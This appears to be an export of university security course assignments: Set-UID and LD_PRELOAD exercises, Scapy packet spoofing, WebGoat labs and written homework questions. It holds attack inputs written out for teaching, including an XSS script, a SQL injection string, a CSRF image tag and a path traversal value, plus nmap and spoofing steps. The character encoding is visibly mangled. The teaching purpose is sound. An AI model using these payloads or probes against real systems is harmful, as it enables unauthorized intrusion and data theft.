theÂ command within the shell environment. We tried an attack that exploited theÂ environment variable in the previous task. Here, let us try a different approach. Please pay attention to the special characters used in a normal shell environment). B. Set q = 1 in the program. This way, the program will use execve() to invoke the command. Q32: Do your attacks from task (a) still work? Please describe and explain your observations. 6. The LD_PRELOAD environment variable. In order to make sure that Set-UID programs are safe from the manipulation of the LD_PRELOAD environment variable, the runtime linker (ld.so) will ignore this variable if the program is a Set-UID root program, except for some conditions. We will figure out what these conditions are in this task. â¦ Let us build a dynamic link library. Create the following program, and name it â€œmylib.câ€. It basically overrides the sleep() function in libc: #include <stdio.h> void sleep (int s) { printf(""I am not sleeping!\n""); } â¦ We can compile the above program using the following commands (in the arguments below, the third character in â€œ-Wlâ€ and the first character in â€œ-lcâ€ are a lowercase â€œLâ€, not a digit one): â¦ gcc -fPIC -g -c mylib.c â¦ gcc -shared -Wl,-soname,libmylib.so.1 -o libmylib.so.1.0.1 mylib.o â€“lc Q33: Provide a screenshot of your outputs. â¦ Now, set the LD_PRELOAD environment variable: â¦ export LD_PRELOAD=./libmylib.so.1.0.1 Q34: Provide a screenshot of your commands (together if possible). â¦ Finally, compile the following program myprog (put this program in the same directory as libmylib.so.1.0.1): /* myprog.c */ int main() { sleep(1); return 0; } gcc -o myprog myprog.c Q35: Provide a screenshot of your commands (together if possible). // Make sure you are root when compiling the â€œmyprog.câ€ program. // Do not execute it immediately, instead, follow the below instructions. Q36: Run â€œmyprogâ€ under the following conditions, and observe what happens. Provide screenshot for the commands and their outputs. Based on your observations, tell us when the runtime linker will ignore the LD_PRELOAD environment variable, and explain why. â¦ Run it as a normal user (not as root): â¦ ./myprog â¦ Make â€œmyprogâ€ a Set-UID root program, and run it as a normal user: â¦ chmod 4755 myprog //to make it set-UID â¦ ./myprog â¦ Make â€œmyprogâ€ a Set-UID root program, and run under the root privileges. â¦ ./myprog //remember that you are effectively root, when executing it â¦ Make â€œmyprogâ€ a Set-UID user1 program (i.e., its owner is user1, which is another user account), and run it as a normal user (not root). â¦ adduser user1 â¦ enter the user password â¦ chown user1 myprog â¦ 7. Relinquishing privileges and cleanup. To be more secure, Set-UID programs usually call setuid() system call to permanently relinquish their root privileges. However, sometimes, this is not enough. When a privileged process transitions to a non-privileged process, one of the common problems that may occur is the so called â€œcapability leakingâ€. The process may have gained some capabilities when it was still privileged. When the privileges are downgraded, if the program does not properly clean up these capabilities, they may still be accessible by the non-privileged processes. For example, after a file is opened, its file descriptor is created, and the latter represents a form of capability, because whoever carries it is able of accessing the corresponding file. The program relinquishes the processâ€™ capability by calling setuid(), but â€œforgetsâ€ to close the file. Now, its descriptor represents a â€œleakedâ€ capability. Compile the following program (see the next page), and make the program a set-root-uid program. â¦ Assuming you call your program hack.c (see its source on the next page): â¦ gcc -o hack hack.c â¦ chmod 4755 hack â¦ ./hack // when executing the code, run it as a normal user. Q37: Provide a screenshot of your commands (together if possible). Q38: Describe what you have observed. Will the file /etc/zzz be modified? Please explain your observation. #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> void main() { int fd; /* Assume that /etc/zzz is an important system file, * and it is owned by root with permission 0644. * Before running this program, you should create * the file /etc/zzz first. */ fd = open(""/etc/zzz"", O_RDWR | O_APPEND); if (fd == -1) { printf(""Cannot open /etc/zzz\n""); exit(0); } /* Simulate the tasks conducted by the program */ sleep(1); /* After the task, the root privileges are no longer needed; it is time to relinquish the root privileges permanently. */ setuid(getuid()); /* getuid() returns the real uid */ if (fork()) { /* In the parent process */ close (fd); exit(0); } else { /* in the child process */ /* Now, assume that the child process is compromised, malicious attackers have injected the following statements into this process */ write (fd,""Malicious Data\n"", 15); close (fd); } }  â¦ References Wenliang Du, â€œSet-UID Privileged Programsâ€ Lecture Notes of CIS/CSE 643: Computer Security, Syracuse University http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Set_UID.pdf The SET-UID man page http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Vulnerability/Set-UID/files/setuid.pdf How to write a SETUID Program http://nob.cs.ucdavis.edu/~bishop/secprog/1987-sproglogin.pdf Wenliang Du, â€œComputer & Internet Security â€“ A Hands-on Approachâ€, 2nd ed., 2019."
INTRO TO COMPUTER SECURITY,5550,Sniffing Spoofing,"Student Name: Course: CSCE 5550 Semester: Fall 2022 Homework 2: Sniffing and Spoofing Homework 2: Sniffing and Spoofing Due on Oct 2 at 11:59pm Grading Rubric: Each question is worth 15 points. Total: 105 points (the actual grade will not exceed 100 points). Submission Guide: You must submit the homework assignment (DOCX or PDF) and all the created Python scripts: mycode.py, sniffer.py, spoof.py, and dns.py; the Python scripts must be placed into a separate ZIP archive. Failure to submit them will result in deduction of 5 points per missing script. This lab uses the Kali 2020 virtual machine (VM). The credentials are: Username: osboxes Password: osboxes.org IMPORTANT NOTE: Before starting this assignment, you must customize your command prompt as described in the Command Prompt Customization Manual. This customization manual directs you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this requirement will receive no credit. In this homework, we will study packet sniffing and spoofing using Scapy ( https://scapy.net/ ), a Python library for packet manipulation. 1. Open a terminal, create a directory â€œhw2â€ and change your current directory to â€œhw2â€. 2. Let us install the scapy library. Run the following commands. (You should wait till the first one is completed, and then run the second one.) sudo apt update sudo apt install python3-scapy 3. Create the following Python script, and place it in a file â€œmycode.pyâ€: from scapy.all import * a = IP() a.show() Student Name: Course: CSCE 5550 Semester: Fall 2022 Homework 2: Sniffing and Spoofing In the above code, we import all the Scapyâ€™s modules (for convenience), then we generate an IP packet and display it. 4. Run this file: python3 mycode.py Q1: Attach a screenshot of the result. 5. Next, let us construct a simple sniffer tool. Create the following Python script, and place it in a file â€œsniffer.pyâ€: from scapy.all import * def pkt_display(pkt): pkt.show() sniff(prn = display_pkt) 6. Run the script: python3 sniffer.py Q2: Attach a screenshot of the result. Note: Root privileges are needed to send packets, so let us try again. 7. Run the script: sudo python3 sniffer.py If nothing is happening, open the browser and access â€œhttp://www.unt.eduâ€. Now, your sniffer will display the captured packets. 8. In the terminal window, stop the packet capture using Ctrl+C. Q3: Attach a screenshot of the result. 9. Add a filter to intercept only ICMP packets. In the file â€œsniffer.pyâ€, update the last line to the following: sniff(filter=â€™icmpâ€™, prn = display_pkt) 10. Run the script: Student Name: Course: CSCE 5550 Semester: Fall 2022 Homework 2: Sniffing and Spoofing sudo python3 sniffer.py Return to the browser window, reload the UNT webpage and observe that your sniffer does not capture any packets. 11. Open a new terminal window and type: ping www.unt.edu Return to the original terminal window and observe that your sniffer is now capturing packets as expected. Q4: Attach a screenshot of the result. 12. Let us now limit the sniffing to our own loopback interface. In the file â€œsniffer.pyâ€, update the last line to the following (the values set for the â€œifaceâ€ parameters are the English letters, the first two letters of the word â€œloopbackâ€): sniff(iface=â€™loâ€™, filter=â€™icmpâ€™, prn = display_pkt) 13. Run the script: sudo python3 sniffer.py 14. Now, let us construct an ICMP request as if was coming from the UNT webserver. In a new terminal window, change the directory to â€œhw2â€, create the following Python script, and place it into a file â€œspoof.pyâ€: from scapy.all import * send(IP(src=â€129.120.231.230â€,dst=â€127.0.0.1â€)/ICMP()) Note: In Scapy, the symbol â€œ/â€ is a composition operator, which is used to stack different layers. 15. Run the script: sudo python3 spoof.py Return to the original terminal window and observe that your sniffer captured an ICMP echo request with the source IP address 129.120.231.230 belonging to the UNT webserver. Remark: Your sniffer may display the echo request packet information twice â€“ this is a known glitch of Scapy when working with the loopback interface. Student Name: Course: CSCE 5550 Semester: Fall 2022 Homework 2: Sniffing and Spoofing Q5: Attach a screenshot of the result. 16. Let us run a TCP SYN scan on the UNT webserver. For this step, we will use Scapy in the interactive mode. Open a new terminal window and run the following command: sudo scapy -H then, we will use the function â€œsr1()â€ â€“ it sends the packet, which is defined by its arguments, and returns the first reply. Run the following command: sr1(IP(dst=""129.120.231.230"")/TCP(dport=80,flags=""S"")) Q6: Attach a screenshot. Explain your observations. Specifically, what kind of response did you receive from the UNT server? 17. Let us create a DNS query â€“ this will be a legitimate query, i.e., no attacks will be performed. Open a terminal window and change the directory to â€œhw2â€. Create the following Python script, and place it into a file â€œdns.pyâ€: from scapy.all import * dns_req = IP(dst='8.8.8.8')/UDP()/DNS(rd=1,qd=DNSQR(qname='www.unt.edu')) answer = sr1(dns_req) print(answer[DNS].show()) 18. Run the script: sudo python3 dns.py Q7: Attach a screenshot. Make sure that it shows a correct IP address of the UNT server (we have seen this address in the previous steps). References 1. The SEED Lab â€œSniffing and Spoofingâ€: https://seedsecuritylabs.org/Labs_20.04/Networking/Sniffing_Spoofing/ 2. Scapy Documentation: https://scapy.readthedocs.io/en/latest/usage.html Student Name: Course: CSCE 5550 Semester: Fall 2022 Homework 2: Sniffing and Spoofing 3. Scapy on thePacketGeek: https://thepacketgeek.com/scapy/"
INTRO TO COMPUTER SECURITY,3550,Software Vulnerability,"Homework 8 (BONUS) Due: 11:59 PM on Thursday, May 5, 2022 Form of submission: PDF, Word, or Text Document in Canvas List three factors that should be considered when developing a security plan. (a) State a security requirement that is not realistic. (b) State a security requirement that is not verifiable. (c) State two security requirements that are inconsistent. For a financial institution, such as a bank, what are the most important assets? What are the minimal computing resources it would need to continue business for a limited period (up to 2 days)? What other systems or processes could it use during the period of a disaster? When is an incident over? That is, what factors influence whether to continue the work of the incident-handling team or to disband it? You discover that your computing system has been infected by a piece of malicious code. You have no idea when the infection occurred. You do have backups performed every week since the system was put into operation, but there have been numerous changes to the system over time. How could you use the backups to construct a â€œcleanâ€ version of your system? Be specific! List the issues involved in the software vulnerability reporting argument (i.e., such as why a company may wait to report a vulnerability that could cause a data breach). What are the technical issues? What are the psychological issues? What are the managerial issues? What are the economic issues? What are the ethical issues?"
INTRO TO COMPUTER SECURITY,3550,WebGoat Access Control,"Lab 4: WebGoat Access Control Lab This lab uses the Kali-20 virtual machine (VM). The credentials are: Username: osboxes Password: osboxes.org â¦ Introduction Web Goat Access Control Vulnerability In this section, we study an attack using access control vulnerability on a web-based access control mechanism, which is simulated by WebGoat. A tomcat server which is running in the background allows various users to access resources (files and folders on the server). We use the â€œWebscarabâ€ tool to intercept the traffic between client (web browser) and tomcat server, and gain unauthorized access to a restricted resource on the server. Download the VM and setup WebGoat: â¦ Make sure you have Oracle Virtual Box 6.1.x installed in your machine. â¦ Download the Kali VM OVA file from the link given on the lab page. â¦ On your local machine, double-click on the OVA file to import the VM to VirtualBox. â¦ Click â€œImportâ€ to import the VM. (This may take a few minutes.) (See the screenshot below.) â¦ Start the VM login with the following credentials: Username: osboxes Password: osboxes.org â¦ After logging in, click on the terminal icon as shown below to start the terminal: â¦ Type the command â€œdocker run -p 8080:8080 -t webgoat/webgoat-7.1â€ and hit enter, as shown below: â¦ You will get a web server started: Normally, you should see a message as above, if WebGoatâ€™s tomcat server start successfully. (Sometimes, the notifications as above are not shown, so please proceed with the next command, regardless whether you see the notifications or not.) Type : â€œhttp://127.0.0.1:8080/webgoat/attackâ€ in the browser address bar to start the WebGoat. (OR) Type : â€œlocalhost:8080/WebGoat/login.mvcâ€ in the browser address bar to start the WebGoat. Default passwords are shown on the below screenshot: Use the â€œguestâ€ login to start the WebGoat.  â¦ Section 1: Access Control Matrix â¦ Click on Access Control Flaws on the side bar and then â€œUsing AccessControl Matrixâ€ link below it. â¦ You will see a list of users from the drop-down menu next to â€œChange user:â€. and the list of resources (folders) from the drop-down menu next to â€œSelect Resource:â€. â¦ Each user has access to specific files. Select a user from dropdown (Ex: moe), select a resource (Ex: Public Share) and click on the Check Access button. You will see the current permission, if you have access or not in a red line above the user name on the same screen. â¦ Q1: To which resource(s) does the user moe not have access? â¦ Section 2: Attack on Access Control â¦ Now, click on â€œBypass path based access control schemeâ€ on the side bar. â¦ Go to Applications Web Application Analysis and open â€œwebscarabâ€. â¦ â¦ â€œWebScarabâ€ window appears, which looks as shown below: d. Go to Proxy Manual Edit and select â€œIntercept requestsâ€. e. Go to Proxy Listeners and observe the used port. f. Next, go to the browser and open the Preferences menu as shown below. g. under Network Settings and click on Settings. h. Make the settings as below. Remove any text in the â€œNo proxy forâ€ box. Give the address and port number from WebScarab and click â€œokâ€. In the Firefox URL location, type â€œabout:configâ€ and hit enter as shown below. Click on â€œAccept Risk and Continueâ€. In the next window, click on â€œShow Allâ€. In the search bar, type â€œnetwork.proxy.allow_hijacking_localhostâ€, as shown below. You will see theÂ field set to â€œfalseâ€, click on the button (highlighted red below) to switch it to â€œtrueâ€. The field will be set to â€œtrueâ€. i. Go back to WebGoat and select one of the files in the list and click on the button â€œView Fileâ€. j. An intercepted request will pop up. k. In the tab â€œURLEncodedâ€ below, row â€œVariableâ€, column â€œValueâ€, type: â€œ../../../../../WEB-INF/spring-security.xmlâ€ and click the â€œAccept changesâ€ button. â¦ Continue clicking on the â€œAccept changesâ€ button until all the intercepted requests are processed. â¦ On the main page of WebGoat, you will see the message in red: â€œCongratulations. You have successfully completed this lesson.â€ Q2: Why do we give the file path for spring-security.xml as relative path (../../../../../WEB-INF/spring-security.xml) instead of giving its absolute path?"
INTRO TO COMPUTER SECURITY,3550,WebGoat Attacks,"Lab 2: WebGoat Attacks Lab This lab uses the Kali 2021 virtual machine (VM) as OVA file KALI-20.ova on Canvas. The credentials are as follows: Username: osboxes Password: osboxes.org Webgoat â¦ Type the docker command to start the web server as shown below: > docker run -p 8080:8080 -t webgoat/webgoat-7.1 â¦ You will then get a web server started (no additional command here): Normally, you should see a message as above if WebGoatâ€™s Apache Tomcat server started successfully. Occasionally, the notifications as above are not shown, so please proceed with the next command, regardless of whether you see the notifications or not. Type: ""localhost:8080/WebGoat/login.mvc"" in the browser address bar to start WebGoat. Default passwords are shown on the below screenshot: Use the ""guest"" login to start WebGoat. CROSS SITE SCRIPTING Select the following option in the WebGoat left hand menu: Cross Site Scripting LAB: Cross Site Scripting Login as user Tom Cat (employee) where password is ""tom"" in the above page. You should then see the following page or similar. Select Tom Cat (employee) and then click on View Profile. Now click on Edit Profile to see the following screen. Now go to Applications 03 â€“ Web Application Analysis and run application webscarab. This application is used to manipulate the data being sent using the HTTP ""POST"" method. After opening webscarab, you should see the following screen: Go to Proxy Manual Edit and select Intercept requests. Go to Proxy Listeners and observe the port and address (in the case shown, it is 127.0.01 and 8008). Now go to your browser (for WebGoat) and open Preferences in the menu. Under General, scroll down to find Network Settings and then click on Settings. Enter the settings as below and, if applicable, remove any text in No proxy for box. Enter the address (127.0.0.1) and port number (8008) from webscarab and click OK. In the browser URL location, type ""about:config"" and hit enter as shown below. Click on ""Accept Risk and Continue"". In the next window, click on ""Show All"". In the search bar, type ""network.proxy.allow_hijacking_localhost"", as shown below. You will see theÂ field set to ""false"". Click on the button (highlighted in red below) to switch it to ""true"". The field will now be set to ""true"". Now, click on Update Profile of Tom Cat (employee). A window pops up showing all the fields in ""Update Profile"" form. Append the following JavaScript to the address1 field: <script>alert(""XSS"");</script> Click Accept Changes. Click OK on the XSS alert. Now, go to webscarab and uncheck the Intercept requests box under Proxy Manual Edit. Then, log out as Tom Cat (employee). Now, letâ€™s login as another user and see if the JavaScript we have added works when we view Tomâ€™s profile. Login as Jerry Mouse (hr) where password is ""jerry"". Select Tom Cat (employee) and View Profile. We should see an alert dialog, saying ""XSS"". This confirms that our script runs when another user is logged in. Using this attack, an attacker can steal user information from the cookies of a victim. Click OK on the XSS alert and logout as Jerry Mouse (hr). Turn off intercept until needed to process the web requests without delay. Q1: Attach a screenshot of your results showing the lab was successful (with the XSS alert logged in as Jerry Mouse (hr). SQL INJECTION SQL Injection is a technique to inject attack code into the SQL queries that run on the server. One simple attack is to inject an attack string to achieve unauthorized access to a userâ€™s account. Select the following option in the WebGoat left hand menu: Injection Flaws LAB: SQL Injection Stage 1: String SQL Injection Start the intercept in webscarab: Go to Proxy Manual Edit and select Intercept requests. In WebGoat, select the admin (last user on the list). We will see how an attacker can login to a vulnerable web application without providing the password. Click Login on the web application and this request is trapped the webscarab as follows: Now tamper the password as follows: Set password as <any string>' OR '1'='1. As an example, we set our password as: PWNED' OR '1'='1. Click Accept changes and Stop intercepting You should be now logged in as the administrator. To verify your admin rights, try viewing any profile. Click Logout to logout as admin. Q2: Attach a screenshot of successful completion of task. CROSS SITE REQUEST FORGERY CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated. With a little help of social engineering (like sending a link via email/chat), an attacker may force the users of a web application to execute actions of the attacker's choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application. Select the following option in the WebGoat left hand menu: Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) In the ""Title:"" field, enter a unique title to grab the victimsâ€™ attention such as ""Free Kittens"". Be sure the Title is unique by including your EUID so we know the submitted solution is yours. In the ""Message: "" field, you will need to load an HTML image where the image is actually empty and a ""transferFunds"" parameter is loaded with an arbitrary value as follows: <img src='attack?Screen=2078372&menu=900&transferFunds=5000'> Then click the ""Submit"" button. (Note: the Screen and menu parameters come from the page source) You should now scroll down to see your new entry in the Message List below: Clicking on your message should cause your message to load on the victim webpage pulling in your exploit code and revealing a green check box next to the WebGoat Cross Site Request Forgery (CSRF) menu option revealing successful completion of this task. (You may need to refresh the page to get the check box.) Q3: Attach a screenshot showing the lab is successful. BUFFER OVERFLOW A buffer overflow occurs when a program or process tries to store more data in aÂ buffer (temporary data storage area) than it was intended to hold. Since buffers are created to contain a finite amount of data, the extra information - which has to go somewhere - can overflow into adjacent buffers, corrupting or overwriting the valid data held in them. Although it may occur accidentally through programming error, buffer overflow is an increasingly common type of security attack onÂ data integrity. In buffer overflow attacks, the extra data may contain codes designed to trigger specific actions, in effect sending new instructions to the attacked computer that could, for example, damage the user's files, change data, or disclose confidential information. There are many variations of the buffer overflow but for this lab we will focuses on web applications. Buffer Overflow and Web Applications Attackers use buffer overflows to corrupt the execution stack of a web application. By sending carefully crafted input to a web application, an attacker can cause the web application to execute arbitrary code â€“ effectively taking over the machine. Buffer overflow flaws can be present in both the web server or application server products that serve the static and dynamic aspects of the site, or the web application itself. Buffer overflows found in widely used server products are likely to become widely known and can pose a significant risk to users of these products. When web applications use libraries, such as a graphics library to generate images, they open themselves to potential buffer overflow attacks. Buffer overflows can also be found in custom web application code, and may even be more likely given the lack of scrutiny that web applications typically go through. Buffer overflow flaws in custom web applications are less likely to be detected because there will normally be far fewer hackers trying to find and exploit such flaws in a specific application. If discovered in a custom application, the ability to exploit the flaw (other than to crash the application) is significantly reduced by the fact that the source code and detailed error messages for the application are normally not available to the hacker. Consequences â¦ Category: Availability: Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop. â¦ Access control (instruction processing): Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a programâ€™s implicit security policy. â¦ Other: When the consequence is arbitrary code execution, this can often be used to subvert any other security service. Exposure period â¦ Requirements specification: The choice could be made to use a language that is not susceptible to these issues. â¦ Design: Mitigating technologies such as safe-string libraries and container abstractions could be introduced. â¦ Implementation: Many logic errors can lead to this condition. It can be exacerbated by lack of or misuse of mitigating technologies. Select the following option in the WebGoat left hand menu: Buffer Overflows Off-by-One Overflows A web page will be displayed; the web page is simulating a room booking. What you need to do â¦ You will enter arbitrary details. First Name A Last Name A Room Number Over 6000 Aâ€™s or any characters as shown below â¦ Click ""Submit"" and then ""Accept Terms"". â¦ Right click on the page and select ""Inspect Element (Q)"" you will be able to see hidden form fields. Remove the type=""HIDDEN"" parameters for all of the guests. â¦ After deleting the parameter type=""HIDDEN"" you will be able to see details of your input data on the web page. Remember the other guestâ€™s information (i.e., First Name, Last Name, Room Number). â¦ Click on ""Restart Lesson"" and give these room details for one of the users to complete the task. (You can use any of the other member room details.) Q4: What is John Smithâ€™s room number? Attach a screenshot of the web page showing the details."
Secure Electronic Commerce,5560,"CSS, XML, Database","Homework 3 Due: 11:59 PM on Friday, March 4, 2022. In this homework assignment, you will take and modify your Homework 2 assignment to add CSS, XML, and database capabilities. Unless so indicated, all requirements in Homework 2 hold in Homework 3, but note that there are some required modifications in this assignment. All student databases should now be created and are accessible using your EUID. You should follow the remaining instructions in the â€œInstalling phpMyAdmin.pdfâ€ document and ensure you have database access. Again, please make sure to follow these instructions exactly as specified and not explicitly add other elements or features. Use a Database Instead of Flat-File System You will manually create a table in your database through the phpMyAdmin interface that supports all of the fields in your HTML form. Then on your original form data for your submit button, instead of writing the information to the <EUID>.txt file, you will insert the data into that table in your database. As a result, you will no longer need the <EUID>.txt file, so that functionality (reading from and writing to the <EUID>.txt file) is no longer needed for this assignment. Note that you may need to slightly modify your data to support a primary key, but all data must be validated. This means that you should not only verify that the user did not leave any fields blank, but also that all data are of the expected and proper format to be inserted into your database (e.g., age should not be negative, etc.). You will then display an error message with a link back to the <EUID>.html page as before if there are any blank fields or invalid data. On your <EUID>.php page, instead of writing the new input data to the file and displaying all of the historical data to the page, you will now simply indicate whether or not the new data was successfully added and then, if successful, display the data for the new record only. At the bottom of the <EUID>.php page, you will provide the link for the user to go back to the <EUID>.html page. Add New Search Functionality On your <EUID>.html page, you will add a search button plus a text field for the user to enter search information. This form data will be sent to your <EUID>.php page that will search your database table for matching information based on your primary key. You will need to modify your <EUID>.php page so that if the search button was clicked, you will search the database table for the data and display the entire record if found. If the record is not found, you will indicate that no matching record was found. At the bottom of the <EUID>.php page, you will provide the link for the user to go back to the <EUID>.html page. Read an XML document and Update the Database XML is used to structure, store, and transport data from one system to another. Using an editor, you will manually create an XML document called <EUID>.xml, where <EUID> should be replaced with your actual EUID. Your XML document will contain tags supporting your form data and be populated with two complete entries. Again, you will manually create this document. Then, you want to modify your <EUID>.php page to read the <EUID>.xml document and insert the two records into your database table. However, keep in mind that this data should only be read in once. As a hint, if the data already exists in the database table, you should not attempt to insert again. Add CSS to your HTML documents You will add CSS to your HTML and/or PHP documents using a <link> element to link to an external CSS file called <EUID>.css, where <EUID> should be replaced with your actual EUID. Note that you should not add CSS using inline or internal methods â€“ external only. You will add a minimum of 4 rules (i.e., 4 selectors) with at least 2 property-value combinations for each rule. For example, the following is 1 rule with 2 property-value combinations: p { font-family: ""sans serif""; color: red; } You may add more rules and property-value combinations as you wish for your desired effect on your web page. REQUIREMENTS: You are to write the HTML, PHP, and XML code solely on your own, without the aid of web page development software (e.g., WordPress, Drupal, etc.) on our Linux CSE servers (e.g., cse01, cse02, â€¦, cse06) or Internet solutions. Points may be deducted for submissions found to contain HTML or PHP code automatically generated or from other sources. You will have to install phpMyAdmin on the Linux CSE server following all steps in the ""Installing phpMyAdmin.pdf"" file on Canvas for this activity. Your HTML and PHP code should be well documented in terms of comments. For example, good comments in general consist of a header (with your name, course section, date, and brief description), comments for each variable, and commented blocks of code. Your scripts will be graded based largely on whether it works correctly on the CSE machines, so you should make sure that your scripts do not have any runtime errors and runs on a CSE machine. If you have any questions about what is expected, please contact your instructor or TA assigned to this course to ensure you understand these directions. This is an individual programming assignment that must be the sole work of the individual student. Any instance of academic dishonesty will result in a grade of â€œFâ€ for the course, along with a report filed into the Academic Integrity Database.  SUBMISSION: You will electronically submit your files in a ZIP folder to the Homework 3 dropbox in Canvas by the due date and time. Please also include the URL and any instructions in a README file to Canvas."
Secure Electronic Commerce,5560,Cybersecurity Attacks 1,"Homework 4 Due: 11:30 AM BEFORE CLASS on Tuesday, March 8, 2022. Please answer in your own words and show any and all work. (20 points) Answer the following questions relating to the CIA triad: Describe an example where a compromise in confidentiality can lead to a compromise in integrity. Identify and describe what security classification property that e-mail spam violates. (20 points) Although there are legal requirements for reporting certain cyber attacks (e.g., when customer sensitive data is breached), briefly explain why an e-commerce site might not want to disclose that it is a victim of a cyber attack? (20 points) Review the OWASP Top 10 security vulnerabilities for 2021 and select one of the identified vulnerabilities. Then write one paragraph describing the vulnerability, at least one prevention technique, and example attack scenario in your own words. (20 points) Review some of the recent software flaws (CVE) from the last 3 months on the National Vulnerability Database (https://nvd.nist.gov/vuln/search). Select one of the many available (hopefully, different than other students might select) and provide a brief one-paragraph synopsis on the vulnerability and any resolutions or prevention techniques associated with the vulnerability in your own words. (20 points) Suppose that UNT already has existing services at https://unt.edu, such as https://unt.edu/academics. Now UNT would like to add a new service for students to create websites as https://untsites.edu/[NAME], where [NAME] is some userâ€™s name such as james. This service would allow you to choose your own NAME and upload any HTML document or script that youâ€™d like. Consider the same-origin policy (SOP) and briefly explain why this option would be a generally better plan than simply allowing users to put websites on https://unt.edu/sites/[NAME]? Unfortunately, the https://untsites.edu/[NAME] solution can still be attacked. Again, with SOP in mind, describe the limitation to this design and suggest a possible solution to address this issue."
Secure Electronic Commerce,5560,Cybersecurity Attacks 2,"Homework 5 Due: 11:59 PM on Friday, April 8, 2022 Please answer in your own words and show any and all work. (33 points) You somehow discover the following Java code in the client login section for your online banking website: ResultSet login(Connect conn, String uname, String passwd) throws SQLException { String query = ""SELECT userID FROM Customers WHERE username = â€™"" + uname + ""' AND password = md5('"" + passwd + ""');""; Statement state = conn.createStatement(); return state.executeQuery(query); } md5 is a hash function that creates an MD5 hash of the password. For the purposes of this problem, you can simply treat this function as simply scrambling the userâ€™s password into a format that is stored in the database. You do not need to worry about the details of how this is done. You may assume that before processing the request, the bankâ€™s server calls login and ensures that the returned Result object contains exactly one userID. If this check fails, the bank will then fail the request. What is important for this question is that the result will be sent if the Result object contains exactly one userID. What username can an attacker enter into the text field in order to issue a request as user â€œAdminâ€ without having to know the password? What username can an attacker enter into the text field in order to delete the Customers table? Now, rewrite the login function using prepared statements. You may assume that there exists a PreparedStatement function called setString(). (12 points) Consider the following code snippet of a buffer overflow example and (i) identify at least one potential coding error specific to buffer overflow and explain why/how it can exploited (not just buffer overflow, but where the problem will manifest itself), and (ii) suggest a specific solution (such as a code change or other ideas discussed) to prevent or mitigate the impact of this deficiency. char src[9]; char dest[9]; char* base_url = ""www.ru.nl""; strncpy(src, base_url, 9); // copies base_url to src strcpy(dest, src); // copies src to dest (10 points) A security expert has made the claim that buffer overflow attacks (i.e., stack smashing) are made possible due to the fact that stacks grow downward on most popular architectures. Therefore, future development should ensure that the stack grows upwards, not downwards to provide a good defense against buffer overflow. Do you agree or disagree with this premise? Why? (12 points) Suppose you are writing a new web database application. Identify and briefly describe at least two approaches you can take to protect yourself against SQL injection attacks. Note that this question is asking for approaches to â€œpreventâ€ an SQL injection attack, not â€œmitigateâ€ the impact. (33 points) In this problem, you will visit Googleâ€™s cross-site scripting site https://xss-game.appspot.com/ to give you the opportunity to find and exploit XSS vulnerabilities. Complete the first three levels of this XSS game and in doing so, (1) show your code or what you typed in the input field or URL bar to exploit the vulnerability, and then (2) describe the vulnerability and how it can be exploited in 2-3 sentences. You may view the target code and use any of the hints provided in each level for help and insight into the potential vulnerability. Level 1: Hello, world of XSS Level 2: Persistence is key Level 3: That sinking feelingâ€¦"
Secure Electronic Commerce,5560,Cybersecurity Attacks 3,"Lab 2: Information Gathering and WebGoat Attacks Lab This lab uses the Kali 2021 virtual machine (VM) as OVA file KALI-20.ova on Canvas. The credentials are as follows: Username: osboxes Password: osboxes.org Information Gathering Before attacking (i.e., pen testing) a website, we need to gather some important value to map the attack surface. If we don't understand how the site is working, what is available on the site, what type of input it takes etc., then we will not be able to launch a good attack. Gathering information and mapping the site is very important, so you will be given a basic understanding of a few tools that can be used but you will need to dig deeper to attack a system. Lab Tasks nslookup (Name Server Lookup) is the name of a program that lets an Internet server administrator, or any computer user enter aÂ hostÂ name. You may access nslookup using the Terminal Emulator. Only if nslookup is not installed: â¦ sudo apt-get update â¦ sudo apt-get install dnsutils nslookup followed by the domain name will display the ""A Record"" (IP Address) of the domain. Use this command to find the address record for google.com: > nslookup google.com Q1: Attach a screenshot of your results from this nslookup command. We can also view all the available DNS records using the -type=any option. > nslookup -type=any google.com Q2: Attach a screenshot of your results from this nslookup command. Since there can be a lot of information presented here, only include the actual data between the server/address (found in the earlier query) and the authoritative answers (where there should be several authoritative answers that start with google.com). Q3: Does the information help you as an attacker? If yes, how? Otherwise, if no, why? nmapÂ (Network Mapper) is a securityÂ scanner used to discoverÂ hostsÂ andÂ servicesÂ on aÂ computer network, thus creating a ""map"" of the network. To accomplish its goal, nmap sends specially crafted packetsÂ to the target host and then analyzes the responses. The software provides several features for probing computer networks, including host discovery and service andÂ operating systemÂ detection. These features are extensible by scripts that provide more advanced service detection,Â vulnerability detection,Â and other features. nmap is also capable of adapting to network conditions includingÂ latencyÂ andÂ congestionÂ during a scan. Only if nmap is not installed: â¦ sudo apt-get install nmap Now, letâ€™s find our gatewayâ€™s open ports as well as OS name and version using nmap. Note that this command requires root privileges. > sudo nmap -O -v 129.120.210.235 Q4: Attach a screenshot of your results from this nmap command. Q5: Does the information help you as an attacker? If yes, how? Otherwise, if no, why? References: 1) http://www.debianhelp.co.uk/nslookup.htm 2) http://nmap.org/nmap_doc.html Webgoat â¦ Type the docker command to start the web server as shown below: > docker run -p 8080:8080 -t webgoat/webgoat-7.1 â¦ You will then get a web server started (no additional command here): Normally, you should see a message as above if WebGoatâ€™s Apache Tomcat server started successfully. Occasionally, the notifications as above are not shown, so please proceed with the next command, regardless of whether you see the notifications or not. Type: ""localhost:8080/WebGoat/login.mvc"" in the browser address bar to start WebGoat. Default passwords are shown on the below screenshot: Use the ""guest"" login to start WebGoat. CROSS SITE SCRIPTING Select the following option in the WebGoat left hand menu: Cross Site Scripting LAB: Cross Site Scripting Login as user Tom Cat (employee) where password is ""tom"" in the above page. You should then see the following page or similar. Select Tom Cat (employee) and then click on View Profile. Now click on Edit Profile to see the following screen. Now go to Applications 03 â€“ Web Application Analysis and run application webscarab. This application is used to manipulate the data being sent using the HTTP ""POST"" method. After opening webscarab, you should see the following screen: Go to Proxy Manual Edit and select Intercept requests. Go to Proxy Listeners and observe the port and address (in the case shown, it is 127.0.01 and 8008). 